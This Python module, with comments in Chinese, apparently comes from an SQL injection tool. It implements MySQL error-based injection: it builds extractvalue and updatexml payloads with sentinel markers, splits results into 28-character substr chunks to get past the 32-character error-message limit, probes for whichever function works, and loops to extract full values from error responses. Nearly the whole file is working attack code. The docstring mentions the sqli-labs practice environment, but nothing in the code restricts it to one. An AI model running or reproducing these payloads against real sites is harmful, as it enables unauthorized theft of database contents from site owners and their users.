"""报错注入：把要取的数据塞进 SQL 报错信息里，再从报错回显中抠出来。

原理：
    extractvalue(1,concat(0x5e5e,(SELECT database()),0x2424))
    -> 报错：XPATH syntax error: '^^security$$'
    0x5e5e = "^^"，0x2424 = "$$"，用哨兵把数据包起来方便正则提取。

两个函数任选其一，updatexml 是备用（部分环境只禁了其中一个）：
    extractvalue(1, concat(0x5e5e, 数据, 0x2424))
    updatexml (1, concat(0x5e5e, 数据, 0x2424), 1)

关键限制：MySQL 报错字符串只保留前 32 个字符（实测 sqli-labs 5.5.53 确认），
所以必须用 substr 分片，每片 28 字符 = 32 - 2(^^) - 2($$)。
不分片的话结尾的 $$ 会被截掉，正则就匹配不到了。

适用场景：页面不回显查询结果（UNION 失效），但会回显 SQL 报错。
比布尔盲注快得多——32 字符的数据只需约 2 个请求就能取完。
"""
from response import analyzer

CHUNK = 28          # 每片长度
LIMIT = 32          # MySQL 报错串的显示上限


def _sliced(select_sql: str, offset: int = 1, length: int = CHUNK) -> str:
    """把标量 SELECT 切出 [offset, offset+length) 这一段。"""
    return f"substr(({select_sql}),{offset},{length})"


def extractvalue(select_sql: str, offset: int = 1, length: int = CHUNK) -> str:
    return f"and extractvalue(1,concat(0x5e5e,{_sliced(select_sql, offset, length)},0x2424))"


def updatexml(select_sql: str, offset: int = 1, length: int = CHUNK) -> str:
    return f"and updatexml(1,concat(0x5e5e,{_sliced(select_sql, offset, length)},0x2424),1)"


# 函数名 -> 构造器，detect() 按顺序试
BUILDERS = {
    "extractvalue": extractvalue,
    "updatexml": updatexml,
}


def detect(injector, probe_sql: str = "SELECT database()"):
    """找一个当前环境可用的报错函数。

    返回 (函数名, 试读到的值)；都不可用时返回 (None, None)。
    函数不存在时响应里是 "FUNCTION xxx does not exist"，没有哨兵 -> 拿不到值。
    """
    for name, build in BUILDERS.items():
        result = injector.inject(build(probe_sql), stage="probe_error_based")
        value = analyzer.extract_sentinel(result.text)
        if value is not None:
            return name, value
    return None, None


def extract_error(injector, build, select_sql: str,
                  max_len: int = 1024, stage: str = "extract"):
    """分片报错提取一条标量 SELECT 的完整值。

    返回 None 表示报错里没有数据（哨兵没出现），和空字符串区分开。
    """
    out = ""
    offset = 1
    while len(out) < max_len:
        result = injector.inject(build(select_sql, offset, CHUNK), stage=stage)
        piece = analyzer.extract_sentinel(result.text)
        if piece is None:
            return out or None
        out += piece
        if len(piece) < CHUNK:
            break          # 最后一片，数据已取完
        offset += CHUNK
    return out
